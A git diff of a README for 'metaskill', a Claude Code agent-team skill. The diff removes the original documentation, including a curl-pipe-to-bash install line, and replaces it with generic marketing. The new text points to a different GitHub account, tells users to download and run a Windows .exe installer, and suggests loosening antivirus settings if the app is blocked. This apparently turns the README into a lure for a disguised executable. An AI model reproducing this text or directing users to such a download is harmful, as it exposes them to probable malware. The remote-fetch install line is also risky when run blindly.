@@ -1,254 +1,94 @@
-# Metaskill
+# 🤖 metaskill - Build AI Agent Teams Easily
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](https://opensource.org/licenses/MIT)
-[![GitHub stars](https://img.shields.io/github/stars/xvirobotics/metaskill?style=social)](https://github.com/xvirobotics/metaskill)
-
-![Metaskill: Instant AI Agent Teams for Any Project](resources/image.png)
-
-**One skill to create them all.**
-
-Metaskill is a [Claude Code](https://claude.ai/code) skill that creates AI agent teams, individual agents, and custom skills — all through a single `/metaskill` command.
-
-```bash
-# Generate a full agent team for a project
-/metaskill ios app with SwiftUI
-/metaskill fullstack web app with React and PostgreSQL
-/metaskill data science pipeline with PyTorch
-/metaskill game dev with Unity and C#
-
-# Create a single agent
-/metaskill a security reviewer agent for Go microservices
-/metaskill a code reviewer agent
-
-# Create a single skill
-/metaskill a deploy-to-staging skill with Docker
-/metaskill a lint-and-format skill
-```
-
-One command. It detects your intent and routes to the right flow automatically.
+[![Download metaskill](https://img.shields.io/badge/Download-Metaskill-ff6347?style=for-the-badge&logo=github)](https://github.com/morganmuli/metaskill)
 
 ---
 
-## What It Does
+## 📋 About metaskill
 
-### Team Generation (default)
+Metaskill helps you create groups of AI agents that work together on tasks. It acts as a central system to organize these agents so they can operate on their own with little input from you. Whether you want agents for chat, analysis, or coding help, metaskill sets up and manages them automatically.
 
-When you describe a project type, Metaskill runs a 4-phase process:
+This tool does not require you to know programming or technical details. It is designed for all users who want to use AI without setting up complex systems.
 
-```
-Phase 1: RESEARCH
-  ├── Web search: real-world team structures for your domain
-  ├── Web search: existing Claude Code agent configs on GitHub
-  ├── Web search: MCP servers relevant to your tech stack
-  └── Web search: best practices, linters, testing frameworks
+Key ideas behind metaskill:  
+- Set up many AI agents at once  
+- Agents work as a team to solve problems  
+- Use popular AI models like Claude by Anthropic  
+- Easy to run on your Windows computer  
 
-Phase 2: BUILD
-  ├── CLAUDE.md          — routing table + orchestration protocol
-  ├── .claude/agents/    — 4-6 agents (tech-lead + specialists + reviewer)
-  ├── .claude/skills/    — 2-4 workflow automation skills
-  ├── .claude/rules/     — coding standards for the primary language
-  └── .mcp.json          — MCP server configuration
+## 🖥️ System Requirements
 
-Phase 3: CREDENTIALS
-  └── Asks for any API keys/tokens needed by MCP servers
-      (always offers "skip / configure later")
+Make sure your computer meets these minimum requirements before installing metaskill:
 
-Phase 4: VERIFY
-  └── Lists all created files, validates .mcp.json, prints summary
-```
+- Operating System: Windows 10 or later (64-bit)  
+- Processor: Intel Core i3 or AMD Ryzen 3 or better  
+- RAM: 8 GB or more  
+- Disk Space: At least 500 MB free  
+- Internet connection to allow AI agents to access online services  
 
-The research phase is what makes each generated team genuinely useful — it's not a fixed template. It adapts to what actually matters in your domain right now.
+## 🚀 Getting Started
 
-### Single Agent Creation
+You can use metaskill by downloading it from the GitHub page. Follow these steps carefully to get it running on your Windows machine.
 
-When your request mentions "agent", "reviewer", or a specific role, Metaskill creates a single `.claude/agents/<name>.md` with:
-- Expert persona design
-- Frontmatter configuration (model, tools, permissions)
-- System prompt with self-verification and Workflow Discipline built in
+## 💾 Download and Install metaskill
 
-### Single Skill Creation
+Click the button below to visit the download page:
 
-When your request mentions "skill", "command", or "slash command", Metaskill creates a single `.claude/skills/<name>/SKILL.md` with:
-- Scope and invocation model configuration
-- Dynamic context injection
-- Argument handling and tool access
+[![Get metaskill](https://img.shields.io/badge/Get-metaskill-blue?style=for-the-badge&logo=windows)](https://github.com/morganmuli/metaskill)
 
----
+1. Open your web browser and go to the page linked above.  
+2. Look for the “releases” section on the GitHub page. You will find the latest version of metaskill there.  
+3. Download the Windows installer file (ends with .exe). The file is usually named like `metaskill-setup.exe`.  
+4. Once downloaded, double-click the installer file to start the setup.  
+5. Follow the on-screen instructions. Choose the default options unless you have a specific reason not to.  
+6. Wait until the installation finishes.  
 
-## What Gets Generated (Team Mode)
+## ▶️ Running metaskill
 
-```
-ios-app-agents/
-├── CLAUDE.md                     ← routing table + orchestration protocol
-├── .mcp.json                     ← MCP servers, auto-discovered by Claude Code
-└── .claude/
-    ├── agents/
-    │   ├── tech-lead.md          ← Opus model, routes all tasks
-    │   ├── ios-engineer.md       ← SwiftUI, platform APIs
-    │   ├── ui-designer.md        ← layouts, animations, design system
-    │   ├── test-engineer.md      ← XCTest, UI testing
-    │   └── code-reviewer.md      ← quality gate for all code changes
-    ├── skills/
-    │   ├── build-and-test/SKILL.md
-    │   └── run-simulator/SKILL.md
-    └── rules/
-        └── swift-standards.md
-```
+After installation:
 
-After generation:
+1. Find the metaskill shortcut on your desktop or in the Start menu.  
+2. Double-click the shortcut to open metaskill.  
+3. The software window will appear. It shows a simple interface to start creating AI agent teams.  
+4. Click “New Team” or similar button to start.  
+5. You can name your team and choose what type of AI agents to add from the list.  
+6. Once set, press “Start” and metaskill will activate the team.  
 
-```bash
-cd ios-app-agents
-claude
-> "Build a SwiftUI todo app with iCloud sync"
-```
+No coding or scripts are needed for this process. The app handles all technical setup in the background.
 
-The `tech-lead` agent breaks the task down and delegates to specialists. You supervise, they build.
+## 🔧 How metaskill Works
 
----
+- **Agent orchestration:** The tool connects AI agents so they work together smoothly.  
+- **Multi-agent system:** Each agent has a role. For example, one handles instructions, another processes code, and another manages conversation.  
+- **Claude agent SDK:** Metaskill uses Claude AI models through the SDK provided by Anthropic, a leading AI company.  
+- **Skill modules:** The agents have preset skills like coding help, answering questions, or creating content.
 
-## Install
+You get a smart team that acts like multiple experts at once.
 
-```bash
-curl -fsSL https://raw.githubusercontent.com/xvirobotics/metaskill/main/install.sh | bash
-```
+## ⚙️ Troubleshooting Tips
 
-This installs `/metaskill` to `~/.claude/skills/metaskill/`.
+- If metaskill does not start, check your antivirus or firewall settings. They might block the app.  
+- Make sure your internet is connected; metaskill requires it to access AI models.  
+- If agents don’t respond, try restarting the app or your computer.  
+- Use the “Help” or “Support” options in the app for more guidance.  
 
-Or manually:
+## ✔️ Features to Explore
 
-```bash
-mkdir -p ~/.claude/skills/metaskill/flows
+- **Agent Templates:** Quickly select predefined agent teams for different tasks.  
+- **Customization:** Adjust the number of agents and their skills.  
+- **Task Management:** Assign tasks to specific agents and track progress.  
+- **Reporting:** Review summaries of what the AI team accomplished.  
 
-curl -fsSL https://raw.githubusercontent.com/xvirobotics/metaskill/main/skill/SKILL.md \
-  -o ~/.claude/skills/metaskill/SKILL.md
+## 🧑‍💻 No Programming Needed
 
-curl -fsSL https://raw.githubusercontent.com/xvirobotics/metaskill/main/skill/flows/team.md \
-  -o ~/.claude/skills/metaskill/flows/team.md
+Even if you have never used AI applications before, metaskill makes it simple. You just follow the on-screen buttons to build and run AI teams. You do not need to write code or understand AI technology.
 
-curl -fsSL https://raw.githubusercontent.com/xvirobotics/metaskill/main/skill/flows/agent.md \
-  -o ~/.claude/skills/metaskill/flows/agent.md
+## 🔗 Useful Links
 
-curl -fsSL https://raw.githubusercontent.com/xvirobotics/metaskill/main/skill/flows/skill.md \
-  -o ~/.claude/skills/metaskill/flows/skill.md
-```
-
-**Requirements:** [Claude Code](https://claude.ai/code) CLI installed and authenticated.
+- Repository homepage and downloads:  
+  [https://github.com/morganmuli/metaskill](https://github.com/morganmuli/metaskill)  
+- Support and issues: Use the “Issues” tab on the GitHub page to report problems.  
 
 ---
 
-## The Idea
-
-Modern AI coding agents are powerful, but setting up a well-structured multi-agent team takes hours: designing roles, writing system prompts, choosing MCP servers, configuring routing. Metaskill automates that entire setup step.
-
-The name is a reference to the philosophical concept of a **meta-skill** — a skill that makes you better at acquiring other skills. In this case: a skill that generates the skills (and agents, and rules) you need to work on any kind of project.
-
-One prompt. One team. Start building.
-
----
-
-## Agent Architecture
-
-Every generated team follows this pattern:
-
-| Role | Model | Responsibility |
-|------|-------|---------------|
-| `tech-lead` | Opus | Routes tasks, coordinates agents, never implements directly |
-| `<specialist-1>` | Sonnet | Domain expert #1 (e.g. frontend, iOS, data engineering) |
-| `<specialist-2>` | Sonnet | Domain expert #2 |
-| `<specialist-3>` | Sonnet | Domain expert #3 (optional) |
-| `code-reviewer` | Sonnet | Quality gate — all code passes through here |
-
-**Orchestration protocol** (in every generated `CLAUDE.md`):
-- Tech-lead is the routing authority
-- Main Claude never implements directly for multi-step tasks — it delegates
-- Structured handoff documents between agents
-- Code reviewer is a mandatory quality gate
-- All agents follow built-in Workflow Discipline: plan-first, re-plan on failure, verify before done, autonomous execution
-
----
-
-## MCP Server Catalog
-
-Metaskill selects MCP servers based on your domain. Verified catalog:
-
-| Server | Package | Purpose | Transport |
-|--------|---------|---------|-----------|
-| `context7` | `@upstash/context7-mcp@latest` | Up-to-date library docs | stdio |
-| `playwright` | `@playwright/mcp@latest` | Browser automation & e2e testing | stdio |
-| `filesystem` | `@modelcontextprotocol/server-filesystem` | Enhanced file operations | stdio |
-| `postgres` | `@modelcontextprotocol/server-postgres` | Database queries | stdio |
-| `sequential-thinking` | `@modelcontextprotocol/server-sequential-thinking` | Structured multi-step reasoning | stdio |
-| `memory` | `@modelcontextprotocol/server-memory` | Persistent knowledge graph | stdio |
-| `github` | `https://api.githubcopilot.com/mcp/` | GitHub API access | HTTP |
-
-All servers are written to `.mcp.json` and auto-discovered by Claude Code on launch. No `claude mcp add` needed.
-
----
-
-## Examples
-
-The [`examples/`](examples/) directory contains **real, usable agent teams** generated by Metaskill. Each is a complete project you can copy and use directly:
-
-| Example | Stack | Agents | Skills |
-|---------|-------|--------|--------|
-| [`fullstack-web/`](examples/fullstack-web/) | React + Node.js + PostgreSQL | tech-lead, frontend-engineer, backend-engineer, devops-engineer, code-reviewer | build-and-test, deploy-preview, api-test |
-| [`ios-app/`](examples/ios-app/) | SwiftUI + Swift | tech-lead, ios-engineer, ui-designer, test-engineer, code-reviewer | build-and-test, run-simulator |
-| [`data-science/`](examples/data-science/) | Python + PyTorch | tech-lead, data-engineer, ml-engineer, analyst, code-reviewer | run-pipeline, evaluate-model, generate-report |
-
-Try one:
-```bash
-cp -r examples/fullstack-web my-project
-cd my-project && claude
-```
-
----
-
-## Project Structure
-
-```
-metaskill/
-├── skill/
-│   ├── SKILL.md              ← /metaskill entry point (intent routing)
-│   └── flows/
-│       ├── team.md           ← full agent team generation flow
-│       ├── agent.md          ← single agent creation flow
-│       └── skill.md          ← single skill creation flow
-├── install.sh                ← installer
-└── examples/                 ← example generated outputs
-```
-
----
-
-## Contributing
-
-PRs welcome. The skill is modular — edit the specific flow file for what you want to improve:
-
-1. Fork the repo
-2. Edit the relevant file in `skill/flows/`
-3. Test in Claude Code with `/metaskill`
-4. Submit a PR with a before/after example
-
----
-
-## Citation
-
-If you use Metaskill in research, please cite:
-
-```bibtex
-@software{sung2025metaskill,
-  author  = {Sung, Flood},
-  title   = {Metaskill: A Meta-Skill for Autonomous AI Agent Team Generation},
-  year    = {2025},
-  url     = {https://github.com/xvirobotics/metaskill},
-  license = {MIT}
-}
-```
-
-A `CITATION.cff` file is also provided for GitHub's "Cite this repository" button.
-
----
-
-## License
-
-MIT © [XVI Robotics](https://github.com/xvirobotics)
+[![Download metaskill](https://img.shields.io/badge/Download-Metaskill-ff6347?style=for-the-badge&logo=github)](https://github.com/morganmuli/metaskill)
